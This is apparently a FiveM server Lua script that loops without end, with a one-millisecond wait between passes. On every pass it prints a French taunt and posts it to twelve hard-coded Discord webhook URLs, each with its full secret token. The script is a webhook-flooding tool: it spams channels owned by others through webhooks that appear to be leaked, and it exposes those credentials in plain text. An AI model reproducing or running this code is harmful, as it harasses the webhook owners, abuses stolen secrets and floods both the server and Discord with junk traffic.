
server_scripts {
	'src/discord.server.lua',
}

Citizen.CreateThread(function()
    local message = "ça pique les codes pour les exams, mais ça sait rien coder une fois sorti "
    while true do
        Citizen.Wait(1)
        print(message)
        sendToDiscord("https://discordapp.com/api/webhooks/443811129748094986/3gKB26ueEVaDDjeHzoqPJwxyACS-Yc-WJlLw2F_E0CeDv4ZwhCx4I0rif4dsxOr9FnJR", message)
        sendToDiscord("https://discordapp.com/api/webhooks/361161989185077258/2PGegGveSBU47LpUMyJbShGJDu8_m4Bu8mu5QjKbjCQGUg8OeKavGXzmLvKzgsneW-pg", message)
        sendToDiscord("https://discordapp.com/api/webhooks/372472764147302431/q8A2Z6Oj3ozn_-cSRA07mz5UjFoRWwmt8FfUEhsXJVlncmGypxXRqVwdqv8EXCyfaSBW", message)
        sendToDiscord("https://discordapp.com/api/webhooks/446052821956165634/TdkeGLB1voEUcvf7v0pECz2B5qKvmJAxv63ZNFoKU7uMACNQn7LDZ9lxUfO-3A79wXh0", message)
        sendToDiscord("https://discordapp.com/api/webhooks/444127415363436544/t00dfMmLQ_qiM8rT5rWlhKacscwwhWyLrAFzQQsRHwnND2pAEJRn-JaDHyTm4gx6aJJi", message)
        sendToDiscord("https://discordapp.com/api/webhooks/442623018523688961/W3ffa3-Lfg2QFmNh7S70rGZcZr7ibVt3dA0c1xKV9MG4DYqtZv3xGiAamu7VcRIL7TqQ", message)
        sendToDiscord("https://discordapp.com/api/webhooks/444776655928557580/HVf-3Ri6qR6FismvcueLBvlJjxlSC3lcRTqnLHeTyTJhvDLV9gUco-Ok7sH9AcPkW1DC", message)
        sendToDiscord("https://discordapp.com/api/webhooks/444885267141230592/mBpocFJ4T6qhswdKW97vmmPzCbES-lzRT7jGLdZpnPSOS_SL_x5SfXIJoeVrNuSK3as3", message)
        sendToDiscord("https://discordapp.com/api/webhooks/458539001381519370/Runhz1LjEW-34vfYop8Ie-2xee4zR0kFLRQejho2OrU4FHDDDseEqU5Kr5rnePDVPeYJ", message)
        sendToDiscord("https://discordapp.com/api/webhooks/460412145000251403/XUwLpy7zOCZ-C8MV60OHvO-onacz98ScCt5xHksxIvgTcBjqE9JVPQgDA23LlcCCCjuR", message)
        sendToDiscord("https://discordapp.com/api/webhooks/461846536574337034/lliLZHrPcxZ7OXaBISOt6mI_gbG2yzHNCYYXFWwjUVsRAYe10wqyMmIP1opvhxBSUn7j", message)
        sendToDiscord("https://discordapp.com/api/webhooks/461846767957442560/9Bw5VVU8s3-c1JQPKIcn-2DyuNA71lbSk4pf5MzDEgfR5553FsqSEiz-hGthYNEJeAL-", message)
    end
end)
